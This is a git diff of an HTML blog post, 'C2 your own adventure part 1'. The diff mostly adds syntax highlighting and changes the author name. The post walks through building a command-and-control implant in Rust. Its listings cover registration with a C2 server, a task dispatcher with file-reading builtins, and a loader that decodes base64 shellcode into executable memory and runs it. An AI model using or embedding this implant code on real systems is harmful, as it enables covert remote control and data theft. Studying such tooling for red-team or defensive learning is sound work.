@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-11-01 Tue 12:42 -->
+<!-- 2022-12-09 Fri 13:37 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>C2 your own adventure part 1</title>
-<meta name="author" content="Main user for my machines" />
+<meta name="author" content="C3lphie" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" type="text/css" href="static/style.css" />
 <script>
@@ -236,26 +236,26 @@ To get development started quickly I went with the rust crate <a href="https://h
 The code written for this component is fairly simple, and is based on the examples provided by <code>hyper</code>.<br>
 </p>
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 1: </span>Source code for the <code>register</code> function</label><pre class="src src-rust">async fn register(imp_inf: &amp;ImplantInfo) -&gt; Result&lt;(), ImplantError&gt; {
-    let client = Client::new();
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Source code for the <code>register</code> function</label><pre class="src src-rust"><span class="org-keyword">async</span> <span class="org-keyword">fn</span> <span class="org-function-name">register</span>(<span class="org-variable-name">imp_inf</span>: <span class="org-rust-ampersand">&amp;</span><span class="org-type">ImplantInfo</span>) -&gt; <span class="org-type">Result</span>&lt;(), <span class="org-type">ImplantError</span>&gt; {
+    <span class="org-keyword">let</span> <span class="org-variable-name">client</span> = <span class="org-type">Client</span>::new();
 
-    let uri = build_c2uri("/reg");
+    <span class="org-keyword">let</span> <span class="org-variable-name">uri</span> = build_c2uri(<span class="org-string">"/reg"</span>);
 
-    let req = Request::builder()
-	.method(Method::POST)
+    <span class="org-keyword">let</span> <span class="org-variable-name">req</span> = <span class="org-type">Request</span>::builder()
+	.method(<span class="org-type">Method</span>::<span class="org-type">POST</span>)
 	.uri(uri)
-	.header("Content-Type", "application/x-www-form-urlencoded")
-	.body(Body::from(format!(
-	    "id={}&amp;os={}&amp;arch={}",
+	.header(<span class="org-string">"Content-Type"</span>, <span class="org-string">"application/x-www-form-urlencoded"</span>)
+	.body(<span class="org-type">Body</span>::from(<span class="org-rust-builtin-formatting-macro">format!</span>(
+	    <span class="org-string">"id=</span><span class="org-rust-string-interpolation">{}</span><span class="org-string">&amp;os=</span><span class="org-rust-string-interpolation">{}</span><span class="org-string">&amp;arch=</span><span class="org-rust-string-interpolation">{}</span><span class="org-string">"</span>,
 	    imp_inf.id, imp_inf.host_inf.os, imp_inf.host_inf.arch
 	)))
-	.expect("request builder");
+	.expect(<span class="org-string">"request builder"</span>);
 
-    let resp = client.request(req).await;
+    <span class="org-keyword">let</span> <span class="org-variable-name">resp</span> = client.request(req).<span class="org-keyword">await</span>;
 
-    match resp {
-	Err(_e) =&gt; return Err(ImplantError::ServerUnreachable),
-	Ok(_) =&gt; Ok(()),
+    <span class="org-keyword">match</span> resp {
+	<span class="org-type">Err</span>(_e) =&gt; <span class="org-keyword">return</span> <span class="org-type">Err</span>(<span class="org-type">ImplantError</span>::<span class="org-type">ServerUnreachable</span>),
+	<span class="org-type">Ok</span>(_) =&gt; <span class="org-type">Ok</span>(()),
     }
 }
 </pre>
@@ -283,22 +283,22 @@ To be able to handle those in an elegant way, and be able easily expand it later
 This enum is the used with the pattern matching functionality in rust to execute<br>
 </p>
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 2: </span>Task handler function</label><pre class="src src-rust">enum ImplantTaskType {
-    Builtin,
-    Module,
-    None,
+<label class="org-src-name"><span class="listing-number">Listing 2: </span>Task handler function</label><pre class="src src-rust"><span class="org-keyword">enum</span> <span class="org-type">ImplantTaskType</span> {
+    <span class="org-type">Builtin</span>,
+    <span class="org-type">Module</span>,
+    <span class="org-type">None</span>,
 }
 
 [...]
 
-fn handle_task(
-    imp_inf: &amp;ImplantInfo,
-    task: &amp;mut ImplatTask,
-) -&gt; Result&lt;ImplantTaskResult, ImplantError&gt; {
-    match task.task_type {
-	ImplantTaskType::Builtin =&gt; builtin_tasks(task),
-	ImplantTaskType::Module =&gt; module_task(task),
-	ImplantTaskType::None =&gt; Err(ImplantError::TaskError),
+<span class="org-keyword">fn</span> <span class="org-function-name">handle_task</span>(
+    <span class="org-variable-name">imp_inf</span>: <span class="org-rust-ampersand">&amp;</span><span class="org-type">ImplantInfo</span>,
+    <span class="org-variable-name">task</span>: <span class="org-rust-ampersand">&amp;</span><span class="org-keyword">mut</span> <span class="org-type">ImplatTask</span>,
+) -&gt; <span class="org-type">Result</span>&lt;<span class="org-type">ImplantTaskResult</span>, <span class="org-type">ImplantError</span>&gt; {
+    <span class="org-keyword">match</span> task.task_type {
+	<span class="org-type">ImplantTaskType</span>::<span class="org-type">Builtin</span> =&gt; builtin_tasks(task),
+	<span class="org-type">ImplantTaskType</span>::<span class="org-type">Module</span> =&gt; module_task(task),
+	<span class="org-type">ImplantTaskType</span>::<span class="org-type">None</span> =&gt; <span class="org-type">Err</span>(<span class="org-type">ImplantError</span>::<span class="org-type">TaskError</span>),
     }
 }
 </pre>
@@ -324,36 +324,36 @@ These implmentations are really simple, but a good introduction to interacting w
 So let's take a closer look at the implementation of <code>cat</code><br>
 </p>
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 3: </span>builtin task function snippet</label><pre class="src src-rust">fn builtin_tasks(
-    task: &amp;mut ImplantTask,
-) -&gt; Result&lt;ImplantTaskResult, ImplantError&gt; {
-    let mut result = ImplantTaskResult::new();
-    match task.name.as_str() {
-	"ls" =&gt; {...}
-	"cd" =&gt; {...}
-	"cat" =&gt; {
-	    for arg in &amp;task.args {
-		let path = Path::new(arg);
+<label class="org-src-name"><span class="listing-number">Listing 3: </span>builtin task function snippet</label><pre class="src src-rust"><span class="org-keyword">fn</span> <span class="org-function-name">builtin_tasks</span>(
+    <span class="org-variable-name">task</span>: <span class="org-rust-ampersand">&amp;</span><span class="org-keyword">mut</span> <span class="org-type">ImplantTask</span>,
+) -&gt; <span class="org-type">Result</span>&lt;<span class="org-type">ImplantTaskResult</span>, <span class="org-type">ImplantError</span>&gt; {
+    <span class="org-keyword">let</span> <span class="org-keyword">mut</span> <span class="org-variable-name">result</span> = <span class="org-type">ImplantTaskResult</span>::new();
+    <span class="org-keyword">match</span> task.name.as_str() {
+	<span class="org-string">"ls"</span> =&gt; {...}
+	<span class="org-string">"cd"</span> =&gt; {...}
+	<span class="org-string">"cat"</span> =&gt; {
+	    <span class="org-keyword">for</span> <span class="org-variable-name">arg</span> <span class="org-keyword">in</span> <span class="org-rust-ampersand">&amp;</span>task.args {
+		<span class="org-keyword">let</span> <span class="org-variable-name">path</span> = <span class="org-type">Path</span>::new(arg);
 		result.push_str(
-		    format!("TARGET: {}:\n", path.display()).as_str(),
+		    <span class="org-rust-builtin-formatting-macro">format!</span>(<span class="org-string">"TARGET: </span><span class="org-rust-string-interpolation">{}</span><span class="org-string">:\n"</span>, path.display()).as_str(),
 		);
-		if !path.exists() {
-		    result.push_str("File does not exist\n");
-		} else if path.is_dir() {
-		    result.push_str("Can't read dir\n");
-		} else if path.is_file() {
-		    let mut file = File::open(path).unwrap();
-		    file.read_to_string(&amp;mut result);
+		<span class="org-keyword">if</span> !path.exists() {
+		    result.push_str(<span class="org-string">"File does not exist\n"</span>);
+		} <span class="org-keyword">else</span> <span class="org-keyword">if</span> path.is_dir() {
+		    result.push_str(<span class="org-string">"Can't read dir\n"</span>);
+		} <span class="org-keyword">else</span> <span class="org-keyword">if</span> path.is_file() {
+		    <span class="org-keyword">let</span> <span class="org-keyword">mut</span> <span class="org-variable-name">file</span> = <span class="org-type">File</span>::open(path).unwrap();
+		    file.read_to_string(<span class="org-rust-ampersand">&amp;</span><span class="org-keyword">mut</span> result);
 		}
-		result.push_str("======================\n")
+		result.push_str(<span class="org-string">"======================\n"</span>)
 	    }
 	}
-	"pwd" =&gt; {...}
-	"whoami" =&gt; {...}
-	_ =&gt; {return Err(ImplantError::TaskError)}
+	<span class="org-string">"pwd"</span> =&gt; {...}
+	<span class="org-string">"whoami"</span> =&gt; {...}
+	_ =&gt; {<span class="org-keyword">return</span> <span class="org-type">Err</span>(<span class="org-type">ImplantError</span>::<span class="org-type">TaskError</span>)}
     }
-    task.run = true;
-    Ok(result)
+    task.run = <span class="org-keyword">true</span>;
+    <span class="org-type">Ok</span>(result)
 }
 </pre>
 </div>
@@ -385,7 +385,7 @@ My result is based on an article from kerkour, which you can read here: <a href=
 I have outlined the steps needed to be done in the figure below:<br>
 </p>
 
-<figure id="org71dc6e3">
+<figure id="org9e4f0ae">
 <img src="assets/2022-07-09_18-16-42_screenshot.png" alt="2022-07-09_18-16-42_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 1: </span>Modular task flow</figcaption>
@@ -401,24 +401,24 @@ Then load it into memory by memorymapping it and then setting it as executable.<
 In the unsafe block, the bytes are copied into the executable memory before the transmute function is called, resulting in a function containing the shellcode.<br>
 </p>
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 4: </span>Modular task handling</label><pre class="src src-rust">fn module_task(
-    task: &amp;mut ImplantTask,
-) -&gt; Result&lt;ImplantTaskResult, ImplantError&gt; {
-    let result: String;
-    if task.args.len() == 1 {
-	let bytes = base64::decode(task.args[0].as_str()).unwrap();
-	let map = MemoryMap::new(
+<label class="org-src-name"><span class="listing-number">Listing 4: </span>Modular task handling</label><pre class="src src-rust"><span class="org-keyword">fn</span> <span class="org-function-name">module_task</span>(
+    <span class="org-variable-name">task</span>: <span class="org-rust-ampersand">&amp;</span><span class="org-keyword">mut</span> <span class="org-type">ImplantTask</span>,
+) -&gt; <span class="org-type">Result</span>&lt;<span class="org-type">ImplantTaskResult</span>, <span class="org-type">ImplantError</span>&gt; {
+    <span class="org-keyword">let</span> <span class="org-variable-name">result</span>: <span class="org-type">String</span>;
+    <span class="org-keyword">if</span> task.args.len() == 1 {
+	<span class="org-keyword">let</span> <span class="org-variable-name">bytes</span> = <span class="org-constant">base64</span>::decode(task.args[0].as_str()).unwrap();
+	<span class="org-keyword">let</span> <span class="org-variable-name">map</span> = <span class="org-type">MemoryMap</span>::new(
 	    bytes.len(),
-	    &amp;[MapExecutable, MapReadable, MapWritable],
+	    <span class="org-rust-ampersand">&amp;</span>[<span class="org-type">MapExecutable</span>, <span class="org-type">MapReadable</span>, <span class="org-type">MapWritable</span>],
 	).unwrap();
-	unsafe{
-	    std::ptr::copy(bytes.as_ptr(), map.data(), bytes.len());
-	    let exec_shellcode: extern "C" fn() -&gt; &amp;str = mem::transmute(map.data());
-	    let res = exec_shellcode();
-	    result = String::from(res);
+	<span class="org-rust-unsafe">unsafe</span>{
+	    <span class="org-constant">std</span>::<span class="org-constant">ptr</span>::copy(bytes.as_ptr(), map.data(), bytes.len());
+	    <span class="org-keyword">let</span> <span class="org-variable-name">exec_shellcode</span>: <span class="org-keyword">extern</span> <span class="org-string">"C"</span> <span class="org-keyword">fn</span>() -&gt; <span class="org-rust-ampersand">&amp;</span><span class="org-type">str</span> = <span class="org-constant">mem</span>::transmute(map.data());
+	    <span class="org-keyword">let</span> <span class="org-variable-name">res</span> = exec_shellcode();
+	    result = <span class="org-type">String</span>::from(res);
 	}
     }
-    Ok(result)
+    <span class="org-type">Ok</span>(result)
 }
 </pre>
 </div>
